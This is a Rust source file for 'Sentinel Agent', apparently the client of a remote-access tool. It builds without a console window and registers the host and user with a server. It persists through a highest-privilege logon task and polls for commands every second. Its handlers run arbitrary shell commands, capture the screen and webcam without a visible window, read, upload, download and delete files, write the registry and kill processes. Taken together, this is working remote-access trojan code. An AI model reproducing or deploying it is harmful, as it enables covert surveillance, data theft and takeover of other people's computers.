// Sentinel Agent — Rust edition.
// Two build targets share this source:
//   agent.exe  → built with --subsystem windows (no console)
//   debug.exe  → normal console build (prints logs)
// First run: auto-registers with the server, persists token next to the exe.
// Then: heartbeats every 5s, polls commands every 1s, streams screen on demand.

#![cfg_attr(all(windows, not(debug_assertions), feature = "windowed"), windows_subsystem = "windows")]

use base64::Engine;
use serde::{Deserialize, Serialize};
use serde_json::{json, Value};
use std::{
    fs,
    io::Cursor,
    path::PathBuf,
    process::Command,
    sync::{
        atomic::{AtomicBool, Ordering},
        Arc, Mutex,
    },
    thread,
    time::{Duration, Instant},
};

// ---------- config ----------
//
// Per-build constants live in `src/binding.rs`. The build server overwrites
// that file with the user's user_id, the website URL the build was created
// from, the build name, and startup/debug flags before running `cargo build`.
mod binding;
mod hiden;
mod input;
mod relay;
mod signaling;
mod webrtc;

const DEFAULT_SERVER: &str = binding::SENTINEL_SERVER;
const BIND_USER_ID: Option<&str> = if binding::OWNER_USER_ID.is_empty() {
    None
} else {
    Some(binding::OWNER_USER_ID)
};
const STARTUP_FLAG: bool = binding::STARTUP_TASK;
const STARTUP_NAME_STR: &str = binding::STARTUP_NAME;

#[derive(Serialize, Deserialize, Clone)]
struct Config {
    server: String,
    device_id: String,
    device_token: String,
}

fn config_path() -> PathBuf {
    std::env::current_exe()
        .ok()
        .and_then(|p| p.parent().map(|d| d.join("sentinel-agent.json")))
        .unwrap_or_else(|| PathBuf::from("sentinel-agent.json"))
}

fn load_config() -> Option<Config> {
    let s = fs::read_to_string(config_path()).ok()?;
    serde_json::from_str(&s).ok()
}

fn save_config(c: &Config) {
    if let Ok(s) = serde_json::to_string_pretty(c) {
        let _ = fs::write(config_path(), s);
    }
}

// ---------- logging (stderr; invisible in windowed build) ----------

macro_rules! log {
    ($($arg:tt)*) => {{
        eprintln!("[{}] {}", chrono_like_ts(), format!($($arg)*));
    }}
}

fn chrono_like_ts() -> String {
    use std::time::{SystemTime, UNIX_EPOCH};
    let secs = SystemTime::now().duration_since(UNIX_EPOCH).map(|d| d.as_secs()).unwrap_or(0);
    let h = (secs / 3600) % 24;
    let m = (secs / 60) % 60;
    let s = secs % 60;
    format!("{:02}:{:02}:{:02}", h, m, s)
}

// ---------- http ----------

fn http() -> ureq::Agent {
    ureq::AgentBuilder::new()
        .timeout_connect(Duration::from_secs(10))
        .timeout(Duration::from_secs(60))
        .user_agent("SentinelAgent-Rust/0.2")
        .build()
}

fn post(server: &str, path: &str, body: &Value) -> Result<Value, String> {
    let url = format!("{}{}", server.trim_end_matches('/'), path);
    match http().post(&url).send_json(body.clone()) {
        Ok(resp) => resp.into_json::<Value>().map_err(|e| e.to_string()),
        Err(ureq::Error::Status(code, resp)) => {
            let body = resp.into_string().unwrap_or_default();
            Err(format!("server {}: {}", code, body))
        }
        Err(e) => Err(e.to_string()),
    }
}

// ---------- registration ----------

fn pc_name() -> String {
    gethostname::gethostname().to_string_lossy().to_string()
}
fn username() -> String {
    whoami::username()
}
fn os_name() -> String {
    if cfg!(windows) { "Windows".into() }
    else if cfg!(target_os = "macos") { "macOS".into() }
    else { "Linux".into() }
}

fn auto_register(server: &str) -> Result<Config, String> {
    let mut body = json!({
        "pc_name": pc_name(),
        "device_name": pc_name(),
        "os": os_name(),
        "username": username(),
    });
    if let Some(uid) = BIND_USER_ID {
        body["bind_user_id"] = json!(uid);
    }
    let resp = post(server, "/api/public/agent/auto-register", &body)?;
    let device_id = resp.get("device_id").and_then(|v| v.as_str())
        .ok_or("missing device_id")?.to_string();
    let device_token = resp.get("device_token").and_then(|v| v.as_str())
        .ok_or("missing device_token")?.to_string();
    let cfg = Config { server: server.to_string(), device_id, device_token };
    save_config(&cfg);
    if STARTUP_FLAG { install_startup(); }
    Ok(cfg)
}

#[cfg(windows)]
fn install_startup() {
    let name = STARTUP_NAME_STR;
    if let Ok(exe) = std::env::current_exe() {
        let exe_s = exe.to_string_lossy().to_string();
        let script = format!(
            "schtasks /Create /F /SC ONLOGON /RL HIGHEST /TN \"{}\" /TR \"\\\"{}\\\"\"",
            name.replace('"', ""), exe_s.replace('"', "")
        );
        let _ = powershell(&script);
    }
}
#[cfg(not(windows))]
fn install_startup() {}

// ---------- heartbeat / poll ----------

static STARTED: once_cell_mini::Lazy<Instant> = once_cell_mini::Lazy::new(Instant::now);

mod once_cell_mini {
    use std::sync::OnceLock;
    pub struct Lazy<T, F = fn() -> T> { cell: OnceLock<T>, init: F }
    impl<T, F: Fn() -> T> Lazy<T, F> {
        pub const fn new(init: F) -> Self { Self { cell: OnceLock::new(), init } }
    }
    impl<T> std::ops::Deref for Lazy<T> {
        type Target = T;
        fn deref(&self) -> &T { self.cell.get_or_init(|| (self.init)()) }
    }
}

fn heartbeat(cfg: &Config) {
    let uptime = STARTED.elapsed().as_secs();
    let mut metrics = json!({ "uptime_seconds": uptime });
    // Collect CPU/RAM/GPU metrics on Windows
    #[cfg(windows)]
    {
        if let Ok(cpu) = powershell("(Get-Counter '\\Processor(_Total)\\% Processor Time').CounterSamples[0].CookedValue") {
            if let Ok(v) = cpu.trim().parse::<f64>() { metrics["cpu_percent"] = json!(v.round()); }
        }
        if let Ok(ram) = powershell("$os=Get-CimInstance Win32_OperatingSystem; [math]::Round(($os.TotalVisibleMemorySize - $os.FreePhysicalMemory) / $os.TotalVisibleMemorySize * 100, 1)") {
            if let Ok(v) = ram.trim().parse::<f64>() { metrics["ram_percent"] = json!(v); }
        }
        if let Ok(ram_info) = powershell("$os=Get-CimInstance Win32_OperatingSystem; \"$([math]::Round(($os.TotalVisibleMemorySize - $os.FreePhysicalMemory)/1024)),$([math]::Round($os.TotalVisibleMemorySize/1024))\"") {
            let parts: Vec<&str> = ram_info.trim().split(',').collect();
            if parts.len() == 2 {
                if let Ok(used) = parts[0].parse::<i64>() { metrics["ram_used_mb"] = json!(used); }
                if let Ok(total) = parts[1].parse::<i64>() { metrics["ram_total_mb"] = json!(total); }
            }
        }
        // GPU utilization via nvidia-smi (NVIDIA) or fallback to 0
        if let Ok(gpu) = powershell("try { $g = (& 'nvidia-smi' '--query-gpu=utilization.gpu' '--format=csv,noheader,nounits' 2>$null); if ($g) { $g.Trim() } else { '' } } catch { '' }") {
            let trimmed = gpu.trim();
            if let Ok(v) = trimmed.parse::<f64>() { metrics["gpu_percent"] = json!(v); }
        }
    }
    let body = json!({
        "device_id": cfg.device_id,
        "device_token": cfg.device_token,
        "username": username(),
        "metrics": metrics,
    });
    if let Err(e) = post(&cfg.server, "/api/public/agent/heartbeat", &body) {
        log!("heartbeat err: {}", e);
    }
}

fn poll(cfg: &Config) -> Vec<Value> {
    let body = json!({ "device_id": cfg.device_id, "device_token": cfg.device_token });
    match post(&cfg.server, "/api/public/agent/poll", &body) {
        Ok(v) => v.get("commands").and_then(|c| c.as_array()).cloned().unwrap_or_default(),
        Err(e) => { log!("poll err: {}", e); vec![] }
    }
}

fn send_result(cfg: &Config, command_id: &str, ok: bool, result: Value, err: Option<String>) {
    let body = json!({
        "device_id": cfg.device_id,
        "device_token": cfg.device_token,
        "command_id": command_id,
        "ok": ok,
        "result": result,
        "error": err.unwrap_or_default(),
    });
    if let Err(e) = post(&cfg.server, "/api/public/agent/result", &body) {
        log!("result err: {}", e);
    }
}

fn push_screen(cfg: &Config, jpeg_b64: &str) -> Result<(), String> {
    let body = json!({
        "device_id": cfg.device_id,
        "device_token": cfg.device_token,
        "jpeg_b64": jpeg_b64,
    });
    post(&cfg.server, "/api/public/agent/screen", &body).map(|_| ())
}

fn push_camera(cfg: &Config, jpeg_b64: &str) -> Result<(), String> {
    let body = json!({
        "device_id": cfg.device_id,
        "device_token": cfg.device_token,
        "jpeg_b64": jpeg_b64,
    });
    post(&cfg.server, "/api/public/agent/camera", &body).map(|_| ())
}

// ---------- camera capture (Windows, via ffmpeg dshow if present) ----------

#[cfg(windows)]
fn capture_camera_jpeg(_quality: u8) -> Result<Vec<u8>, String> {
    use std::os::windows::process::CommandExt;
    const CREATE_NO_WINDOW: u32 = 0x0800_0000;

    // Discover first available DirectShow video device via ffmpeg.
    let list = Command::new("ffmpeg")
        .args(["-hide_banner", "-list_devices", "true", "-f", "dshow", "-i", "dummy"])
        .creation_flags(CREATE_NO_WINDOW)
        .output()
        .map_err(|_| "ffmpeg not installed — install ffmpeg.exe in PATH for camera capture".to_string())?;
    let text = String::from_utf8_lossy(&list.stderr).to_string();
    let mut device: Option<String> = None;
    let mut in_video = false;
    for line in text.lines() {
        if line.contains("DirectShow video devices") { in_video = true; continue; }
        if line.contains("DirectShow audio devices") { in_video = false; }
        if in_video {
            if let (Some(a), Some(b)) = (line.find('"'), line.rfind('"')) {
                if b > a {
                    device = Some(line[a + 1..b].to_string());
                    break;
                }
            }
        }
    }
    let device = device.ok_or("no DirectShow video device found")?;

    let tmp = std::env::temp_dir().join("sentinel-cam.jpg");
    let _ = fs::remove_file(&tmp);
    let arg = format!("video={}", device);
    let out = Command::new("ffmpeg")
        .args(["-hide_banner", "-loglevel", "error", "-y", "-f", "dshow", "-i", &arg,
               "-frames:v", "1", "-q:v", "5", tmp.to_str().unwrap_or("cam.jpg")])
        .creation_flags(CREATE_NO_WINDOW)
        .output()
        .map_err(|e| e.to_string())?;
    if !out.status.success() {
        return Err(String::from_utf8_lossy(&out.stderr).to_string());
    }
    fs::read(&tmp).map_err(|e| e.to_string())
}

#[cfg(not(windows))]
fn capture_camera_jpeg(_q: u8) -> Result<Vec<u8>, String> {
    Err("camera capture only supported on Windows".into())
}

// ---------- screen capture ----------

#[cfg(windows)]
fn capture_jpeg(quality: u8) -> Result<(Vec<u8>, u32, u32), String> {
    use screenshots::Screen;
    let screens = Screen::all().map_err(|e| e.to_string())?;
    let screen = screens.into_iter().next().ok_or("no screens")?;
    let img = screen.capture().map_err(|e| e.to_string())?;
    let (w, h) = (img.width(), img.height());
    let rgba = img.into_raw();
    // image crate expects RGBA -> encode JPEG (drops alpha)
    let dyn_img = image::RgbaImage::from_raw(w, h, rgba)
        .ok_or("rgba buffer size mismatch")?;
    let rgb = image::DynamicImage::ImageRgba8(dyn_img).to_rgb8();
    let mut buf = Cursor::new(Vec::with_capacity(256 * 1024));
    let q = quality.clamp(20, 90);
    image::codecs::jpeg::JpegEncoder::new_with_quality(&mut buf, q)
        .encode(rgb.as_raw(), w, h, image::ExtendedColorType::Rgb8)
        .map_err(|e| e.to_string())?;
    Ok((buf.into_inner(), w, h))
}

#[cfg(not(windows))]
fn capture_jpeg(_q: u8) -> Result<(Vec<u8>, u32, u32), String> {
    Err("screen capture only supported on Windows".into())
}

// ---------- command handlers ----------

fn run_shell(cmd: &str) -> Value {
    #[cfg(windows)]
    let out = Command::new("cmd").args(["/C", cmd]).output();
    #[cfg(not(windows))]
    let out = Command::new("sh").args(["-c", cmd]).output();
    match out {
        Ok(o) => json!({
            "stdout": truncate(String::from_utf8_lossy(&o.stdout).to_string(), 200_000),
            "stderr": truncate(String::from_utf8_lossy(&o.stderr).to_string(), 200_000),
            "exit_code": o.status.code().unwrap_or(-1),
        }),
        Err(e) => json!({ "stdout": "", "stderr": e.to_string(), "exit_code": -1 }),
    }
}

fn truncate(mut s: String, n: usize) -> String {
    if s.len() > n { s.truncate(n); s.push_str("\n…[truncated]"); }
    s
}

fn fs_list(p: &str) -> Result<Value, String> {
    let path = if p.is_empty() { if cfg!(windows) { "C:\\".into() } else { "/".into() } } else { p.to_string() };
    let entries = fs::read_dir(&path).map_err(|e| e.to_string())?;
    let mut out = vec![];
    for e in entries.flatten() {
        if let Ok(meta) = e.metadata() {
            out.push(json!({
                "name": e.file_name().to_string_lossy(),
                "is_dir": meta.is_dir(),
                "size": meta.len(),
            }));
        }
    }
    Ok(json!({ "path": path, "entries": out }))
}

fn fs_read(p: &str) -> Result<Value, String> {
    let meta = fs::metadata(p).map_err(|e| e.to_string())?;
    if meta.len() > 5_000_000 { return Err("file too large (max 5MB)".into()); }
    let data = fs::read(p).map_err(|e| e.to_string())?;
    Ok(json!({ "content": String::from_utf8_lossy(&data), "size": data.len() }))
}

fn fs_delete(p: &str) -> Result<Value, String> {
    let meta = fs::metadata(p).map_err(|e| e.to_string())?;
    if meta.is_dir() { fs::remove_dir_all(p) } else { fs::remove_file(p) }
        .map_err(|e| e.to_string())?;
    Ok(json!({ "deleted": p }))
}

fn proc_list() -> Result<Value, String> {
    #[cfg(windows)]
    {
        let out = Command::new("tasklist").args(["/fo", "csv", "/nh"])
            .output().map_err(|e| e.to_string())?;
        let text = String::from_utf8_lossy(&out.stdout);
        let mut procs = vec![];
        for line in text.lines() {
            let cols: Vec<&str> = line.split("\",\"").map(|s| s.trim_matches('"')).collect();
            if cols.len() >= 5 {
                let pid: i64 = cols[1].parse().unwrap_or(0);
                let mem_str: String = cols[4].chars().filter(|c| c.is_ascii_digit()).collect();
                let kb: f64 = mem_str.parse().unwrap_or(0.0);
                procs.push(json!({
                    "pid": pid,
                    "name": cols[0],
                    "memory_mb": kb / 1024.0,
                }));
            }
        }
        Ok(json!({ "processes": procs }))
    }
    #[cfg(not(windows))]
    { Ok(json!({ "processes": [] })) }
}

fn proc_kill(pid: i64) -> Result<Value, String> {
    #[cfg(windows)]
    {
        let out = Command::new("taskkill").args(["/F", "/PID", &pid.to_string()])
            .output().map_err(|e| e.to_string())?;
        if !out.status.success() {
            return Err(String::from_utf8_lossy(&out.stderr).to_string());
        }
    }
    Ok(json!({ "killed": pid }))
}

fn now_ms_v() -> Value {
    use std::time::{SystemTime, UNIX_EPOCH};
    let ms = SystemTime::now().duration_since(UNIX_EPOCH).map(|d| d.as_millis()).unwrap_or(0);
    json!(ms as u64)
}

// ---------- extra fs / proc / reg / services / net / wnd / browser / sysinfo ----------

fn fs_mkdir(p: &str) -> Result<Value, String> {
    if p.is_empty() { return Err("empty path".into()); }
    fs::create_dir_all(p).map_err(|e| e.to_string())?;
    Ok(json!({ "created": p }))
}

fn fs_rename(from: &str, to: &str) -> Result<Value, String> {
    if from.is_empty() || to.is_empty() { return Err("missing from/to".into()); }
    fs::rename(from, to).map_err(|e| e.to_string())?;
    Ok(json!({ "renamed": [from, to] }))
}

fn fs_zip(p: &str) -> Result<Value, String> {
    let dest = format!("{}.zip", p);
    #[cfg(windows)]
    {
        let script = format!(
            "Compress-Archive -Path '{}' -DestinationPath '{}' -Force",
            ps_escape(p), ps_escape(&dest)
        );
        powershell(&script)?;
    }
    Ok(json!({ "dest": dest }))
}

fn fs_unzip(p: &str) -> Result<Value, String> {
    let dest = p.trim_end_matches(".zip").to_string() + "_extracted";
    #[cfg(windows)]
    {
        let script = format!(
            "Expand-Archive -Path '{}' -DestinationPath '{}' -Force",
            ps_escape(p), ps_escape(&dest)
        );
        powershell(&script)?;
    }
    Ok(json!({ "dest": dest }))
}

fn fs_upload(p: &str) -> Result<Value, String> {
    let meta = fs::metadata(p).map_err(|e| e.to_string())?;
    if meta.len() > 20_000_000 { return Err("file too large (max 20MB over WS)".into()); }
    let data = fs::read(p).map_err(|e| e.to_string())?;
    let b64 = base64::engine::general_purpose::STANDARD.encode(&data);
    Ok(json!({ "data_b64": b64, "size": data.len() }))
}

fn fs_download(url: &str, dest: &str) -> Result<Value, String> {
    if url.is_empty() || dest.is_empty() { return Err("missing url/dest".into()); }
    let resp = http().get(url).call().map_err(|e| e.to_string())?;
    let mut reader = resp.into_reader();
    let mut buf = Vec::with_capacity(64 * 1024);
    std::io::Read::read_to_end(&mut reader, &mut buf).map_err(|e| e.to_string())?;
    fs::write(dest, &buf).map_err(|e| e.to_string())?;
    Ok(json!({ "dest": dest, "size": buf.len() }))
}

fn proc_tree_kill(pid: i64) -> Result<Value, String> {
    #[cfg(windows)]
    {
        let out = Command::new("taskkill").args(["/F", "/T", "/PID", &pid.to_string()])
            .output().map_err(|e| e.to_string())?;
        if !out.status.success() {
            return Err(String::from_utf8_lossy(&out.stderr).to_string());
        }
    }
    Ok(json!({ "tree_killed": pid }))
}

fn proc_start(command: &str, args: &str) -> Result<Value, String> {
    if command.is_empty() { return Err("empty command".into()); }
    #[cfg(windows)]
    {
        use std::os::windows::process::CommandExt;
        const DETACHED: u32 = 0x0000_0008;
        let mut c = Command::new(command);
        if !args.is_empty() {
            c.args(args.split_whitespace());
        }
        let child = c.creation_flags(DETACHED).spawn().map_err(|e| e.to_string())?;
        Ok(json!({ "pid": child.id(), "command": command }))
    }
    #[cfg(not(windows))]
    {
        let _ = args;
        Err("proc.start only on Windows".into())
    }
}

// Registry — all via `reg.exe` (built into Windows). Keys use the `HKCU\Path`
// or `HKCU:\Path` convention that panels already send.
fn reg_normalize(key: &str) -> String { key.replace(":\\", "\\").replace('/', "\\") }

fn reg_list(key: &str) -> Result<Value, String> {
    #[cfg(windows)]
    {
        let k = reg_normalize(key);
        let out = Command::new("reg").args(["query", &k]).output().map_err(|e| e.to_string())?;
        let text = String::from_utf8_lossy(&out.stdout);
        let mut subkeys = vec![];
        let mut values = vec![];
        for line in text.lines() {
            let t = line.trim();
            if t.is_empty() { continue; }
            if t.starts_with("HK") {
                if !t.eq_ignore_ascii_case(&k) { subkeys.push(t.to_string()); }
            } else {
                // Value line:  NAME    TYPE    DATA
                let parts: Vec<&str> = t.splitn(3, "    ").map(|s| s.trim()).filter(|s| !s.is_empty()).collect();
                if parts.len() >= 2 {
                    values.push(json!({
                        "name": parts[0],
                        "type": parts[1],
                        "value": parts.get(2).copied().unwrap_or(""),
                    }));
                }
            }
        }
        Ok(json!({ "key": k, "subkeys": subkeys, "values": values }))
    }
    #[cfg(not(windows))]
    { let _ = key; Err("registry only on Windows".into()) }
}

fn reg_read(key: &str) -> Result<Value, String> {
    #[cfg(windows)]
    {
        let k = reg_normalize(key);
        let out = Command::new("reg").args(["query", &k]).output().map_err(|e| e.to_string())?;
        Ok(json!({ "data": String::from_utf8_lossy(&out.stdout).to_string() }))
    }
    #[cfg(not(windows))]
    { let _ = key; Err("registry only on Windows".into()) }
}

fn reg_write(payload: &Value) -> Result<Value, String> {
    #[cfg(windows)]
    {
        let key  = reg_normalize(payload.get("key").and_then(|v| v.as_str()).unwrap_or(""));
        let name = payload.get("name").and_then(|v| v.as_str()).unwrap_or("");
        let val  = payload.get("value").and_then(|v| v.as_str()).unwrap_or("");
        let kind = payload.get("kind").and_then(|v| v.as_str()).unwrap_or("String");
        let t = match kind {
            "DWord"        => "REG_DWORD",
            "QWord"        => "REG_QWORD",
            "ExpandString" => "REG_EXPAND_SZ",
            "MultiString"  => "REG_MULTI_SZ",
            "Binary"       => "REG_BINARY",
            _              => "REG_SZ",
        };
        let out = Command::new("reg")
            .args(["add", &key, "/v", name, "/t", t, "/d", val, "/f"])
            .output().map_err(|e| e.to_string())?;
        if !out.status.success() {
            return Err(String::from_utf8_lossy(&out.stderr).to_string());
        }
        Ok(json!({ "written": name }))
    }
    #[cfg(not(windows))]
    { let _ = payload; Err("registry only on Windows".into()) }
}

fn reg_delete(key: &str, name: &str) -> Result<Value, String> {
    #[cfg(windows)]
    {
        let k = reg_normalize(key);
        let out = Command::new("reg").args(["delete", &k, "/v", name, "/f"]).output().map_err(|e| e.to_string())?;
        if !out.status.success() { return Err(String::from_utf8_lossy(&out.stderr).to_string()); }
        Ok(json!({ "deleted": name }))
    }
    #[cfg(not(windows))]
    { let _ = (key, name); Err("registry only on Windows".into()) }
}

fn reg_startup_list() -> Result<Value, String> {
    #[cfg(windows)]
    {
        let keys = [
            r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
            r"HKLM\Software\Microsoft\Windows\CurrentVersion\Run",
            r"HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce",
            r"HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce",
        ];
        let mut lines = String::new();
        for k in keys.iter() {
            if let Ok(o) = Command::new("reg").args(["query", k]).output() {
                lines.push_str(&format!("── {} ──\n", k));
                lines.push_str(&String::from_utf8_lossy(&o.stdout));
                lines.push('\n');
            }
        }
        Ok(json!({ "entries": lines }))
    }
    #[cfg(not(windows))]
    { Err("registry only on Windows".into()) }
}

fn services_list() -> Result<Value, String> {
    #[cfg(windows)]
    {
        let out = powershell(
            "Get-Service | Select-Object Name,DisplayName,Status,StartType | \
             ConvertTo-Json -Compress -Depth 2"
        )?;
        let parsed: Value = serde_json::from_str(&out).unwrap_or(Value::Null);
        Ok(json!({ "services": parsed }))
    }
    #[cfg(not(windows))]
    { Ok(json!({ "services": [] })) }
}

fn services_control(name: &str, op: &str) -> Result<Value, String> {
    #[cfg(windows)]
    {
        if name.is_empty() { return Err("empty service name".into()); }
        let verb = match op {
            "start"   => "Start-Service",
            "stop"    => "Stop-Service",
            "restart" => "Restart-Service",
            _         => return Err(format!("unknown op: {}", op)),
        };
        let script = format!("{} -Name '{}' -Force", verb, ps_escape(name));
        powershell(&script)?;
        Ok(json!({ "ok": true, "name": name, "op": op }))
    }
    #[cfg(not(windows))]
    { let _ = (name, op); Err("services only on Windows".into()) }
}

fn net_connections() -> Result<Value, String> {
    #[cfg(windows)]
    {
        let out = Command::new("netstat").args(["-ano"]).output().map_err(|e| e.to_string())?;
        let text = String::from_utf8_lossy(&out.stdout);
        let mut rows = vec![];
        for line in text.lines() {
            let cols: Vec<&str> = line.split_whitespace().collect();
            if cols.len() < 4 { continue; }
            let proto = cols[0];
            if proto != "TCP" && proto != "UDP" { continue; }
            rows.push(json!({
                "proto":  proto,
                "local":  cols[1],
                "remote": cols.get(2).copied().unwrap_or("*"),
                "state":  if proto == "TCP" { cols.get(3).copied().unwrap_or("") } else { "" },
                "pid":    cols.last().and_then(|s| s.parse::<i64>().ok()).unwrap_or(0),
            }));
        }
        Ok(json!({ "connections": rows }))
    }
    #[cfg(not(windows))]
    { Ok(json!({ "connections": [] })) }
}

fn wnd_list() -> Result<Value, String> {
    #[cfg(windows)]
    {
        let out = powershell(
            "Get-Process | Where-Object { $_.MainWindowTitle -ne '' } | \
             Select-Object Id,ProcessName,MainWindowTitle | ConvertTo-Json -Compress -Depth 2"
        )?;
        let parsed: Value = serde_json::from_str(&out).unwrap_or(Value::Null);
        Ok(json!({ "windows": parsed }))
    }
    #[cfg(not(windows))]
    { Ok(json!({ "windows": [] })) }
}

fn wnd_action(op: &str, title: &str) -> Result<Value, String> {
    #[cfg(windows)]
    {
        if title.is_empty() { return Err("empty title".into()); }
        // Match window by substring — best effort, single-shot.
        let script = match op {
            "focus" => format!(
                "$w = New-Object -ComObject WScript.Shell; $w.AppActivate('{}')",
                ps_escape(title)
            ),
            "close" => format!(
                "Get-Process | Where-Object {{ $_.MainWindowTitle -like '*{}*' }} | \
                 ForEach-Object {{ $_.CloseMainWindow() | Out-Null }}",
                ps_escape(title)
            ),
            "minimize" | "maximize" => {
                let cmd = if op == "minimize" { 6 } else { 3 };
                format!(
                    "Add-Type '@ using System; using System.Runtime.InteropServices; \
                     public class W {{ [DllImport(\"user32.dll\")] public static extern bool ShowWindow(IntPtr h, int c); \
                     [DllImport(\"user32.dll\")] public static extern IntPtr FindWindow(string a, string b); }} '@; \
                     $h = [W]::FindWindow($null, '{}'); if ($h -ne 0) {{ [W]::ShowWindow($h, {}) }}",
                    ps_escape(title), cmd
                )
            }
            _ => return Err(format!("unknown wnd op: {}", op)),
        };
        powershell(&script)?;
        Ok(json!({ "ok": true, "op": op, "title": title }))
    }
    #[cfg(not(windows))]
    { let _ = (op, title); Err("windows control only on Windows".into()) }
}

fn browser_list() -> Result<Value, String> {
    #[cfg(windows)]
    {
        let candidates = [
            ("Chrome",  r"C:\Program Files\Google\Chrome\Application\chrome.exe"),
            ("Chrome",  r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"),
            ("Edge",    r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"),
            ("Firefox", r"C:\Program Files\Mozilla Firefox\firefox.exe"),
            ("Firefox", r"C:\Program Files (x86)\Mozilla Firefox\firefox.exe"),
            ("Brave",   r"C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"),
            ("Opera",   r"C:\Program Files\Opera\launcher.exe"),
        ];
        let mut installed = vec![];
        for (name, path) in candidates.iter() {
            if std::path::Path::new(path).exists() {
                installed.push(json!({ "name": name, "path": path }));
            }
        }
        Ok(json!({ "browsers": installed }))
    }
    #[cfg(not(windows))]
    { Ok(json!({ "browsers": [] })) }
}

fn sysinfo_snapshot() -> Result<Value, String> {
    #[cfg(windows)]
    {
        let script = "\
            $os = Get-CimInstance Win32_OperatingSystem; \
            $cs = Get-CimInstance Win32_ComputerSystem; \
            $cpu = Get-CimInstance Win32_Processor | Select-Object -First 1; \
            $gpu = Get-CimInstance Win32_VideoController | Select-Object -First 1; \
            $bios = Get-CimInstance Win32_BIOS; \
            $disks = Get-CimInstance Win32_LogicalDisk | Where-Object { $_.DriveType -eq 3 } | \
                     Select-Object DeviceID,@{n='SizeGB';e={[math]::Round($_.Size/1GB,1)}},@{n='FreeGB';e={[math]::Round($_.FreeSpace/1GB,1)}}; \
            @{ \
                os=$os.Caption; version=$os.Version; hostname=$cs.Name; manufacturer=$cs.Manufacturer; \
                model=$cs.Model; cpu=$cpu.Name; cores=$cpu.NumberOfCores; threads=$cpu.NumberOfLogicalProcessors; \
                gpu=$gpu.Name; gpuRam=[math]::Round($gpu.AdapterRAM/1MB); bios=$bios.SMBIOSBIOSVersion; \
                ramTotalGB=[math]::Round($cs.TotalPhysicalMemory/1GB,1); disks=$disks \
            } | ConvertTo-Json -Compress -Depth 3";
        let out = powershell(script)?;
        let parsed: Value = serde_json::from_str(&out).unwrap_or(json!({ "raw": out }));
        Ok(parsed)
    }
    #[cfg(not(windows))]
    { Ok(json!({})) }
}


fn powershell(script: &str) -> Result<String, String> {
    #[cfg(windows)]
    {
        use std::os::windows::process::CommandExt;
        const CREATE_NO_WINDOW: u32 = 0x0800_0000;
        let out = Command::new("powershell")
            .args(["-NoProfile", "-NonInteractive", "-Command", script])
            .creation_flags(CREATE_NO_WINDOW)
            .output().map_err(|e| e.to_string())?;
        if !out.status.success() {
            return Err(String::from_utf8_lossy(&out.stderr).to_string());
        }
        Ok(String::from_utf8_lossy(&out.stdout).trim().to_string())
    }
    #[cfg(not(windows))]
    { let _ = script; Err("powershell not available".into()) }
}

fn system_action(action: &str, payload: &Value) -> Result<Value, String> {
    match action {
        "system.shutdown" => {
            #[cfg(windows)]
            Command::new("shutdown").args(["/s", "/t", "5"]).status().map_err(|e| e.to_string())?;
            Ok(json!({ "ok": true }))
        }
        "system.restart" => {
            #[cfg(windows)]
            Command::new("shutdown").args(["/r", "/t", "5"]).status().map_err(|e| e.to_string())?;
            Ok(json!({ "ok": true }))
        }
        "system.lock" => {
            #[cfg(windows)]
            Command::new("rundll32.exe").arg("user32.dll,LockWorkStation")
                .status().map_err(|e| e.to_string())?;
            Ok(json!({ "ok": true }))
        }
        "system.notify" => {
            let msg = payload.get("message").and_then(|v| v.as_str()).unwrap_or("Notification");
            let title = payload.get("title").and_then(|v| v.as_str()).unwrap_or("Sentinel");
            #[cfg(windows)]
            {
                let script = format!(
                    "Add-Type -AssemblyName System.Windows.Forms; \
                     $n = New-Object System.Windows.Forms.NotifyIcon; \
                     $n.Icon = [System.Drawing.SystemIcons]::Information; \
                     $n.Visible = $true; \
                     $n.ShowBalloonTip(5000, '{}', '{}', 'Info'); \
                     Start-Sleep -Seconds 6; $n.Dispose()",
                    ps_escape(title), ps_escape(msg)
                );
                let _ = powershell(&script);
            }
            Ok(json!({ "ok": true, "message": msg }))
        }
        "system.volume.set" => {
            let level = payload.get("level").and_then(|v| v.as_f64()).unwrap_or(50.0).clamp(0.0, 100.0);
            #[cfg(windows)]
            {
                // Reset to 0 (50 vol-down presses), then up to level/2 presses (~2% step).
                let script = format!(
                    "$w = New-Object -ComObject WScript.Shell; \
                     for($i=0;$i -lt 50;$i++) {{ $w.SendKeys([char]174) }}; \
                     $steps = [math]::Round({} / 2); \
                     for($i=0;$i -lt $steps;$i++) {{ $w.SendKeys([char]175) }}",
                    level
                );
                let _ = powershell(&script);
            }
            Ok(json!({ "ok": true, "level": level }))
        }
        "system.volume.mute" => {
            #[cfg(windows)]
            {
                let _ = powershell("(New-Object -ComObject WScript.Shell).SendKeys([char]173)");
            }
            Ok(json!({ "ok": true }))
        }
        "system.sound.play" => {
            // payload.url = http(s) url to .wav/.mp3, or local path
            let src = payload.get("url").and_then(|v| v.as_str()).unwrap_or("").to_string();
            if src.is_empty() { return Err("missing url".into()); }
            #[cfg(windows)]
            {
                let local_path = if src.starts_with("http") {
                    let tmp = std::env::temp_dir().join("sentinel-sound.tmp");
                    download_to(&src, &tmp)?;
                    tmp.to_string_lossy().to_string()
                } else { src.clone() };
                let lower = local_path.to_lowercase();
                if lower.ends_with(".wav") {
                    let script = format!(
                        "(New-Object Media.SoundPlayer '{}').PlaySync()",
                        ps_escape(&local_path)
                    );
                    let _ = powershell(&script);
                } else {
                    // Use Windows Media Player COM for mp3/other.
                    let script = format!(
                        "$p = New-Object -ComObject WMPlayer.OCX; \
                         $p.URL = '{}'; \
                         $p.controls.play(); \
                         while ($p.playState -ne 1) {{ Start-Sleep -Milliseconds 200 }}",
                        ps_escape(&local_path)
                    );
                    let _ = powershell(&script);
                }
            }
            Ok(json!({ "ok": true, "src": src }))
        }
        _ => Err(format!("unknown system action: {}", action)),
    }
}

fn ps_escape(s: &str) -> String { s.replace('\'', "''") }

fn download_to(url: &str, path: &PathBuf) -> Result<(), String> {
    let resp = http().get(url).call().map_err(|e| e.to_string())?;
    let mut reader = resp.into_reader();
    let mut buf = Vec::with_capacity(64 * 1024);
    std::io::Read::read_to_end(&mut reader, &mut buf).map_err(|e| e.to_string())?;
    fs::write(path, buf).map_err(|e| e.to_string())?;
    Ok(())
}

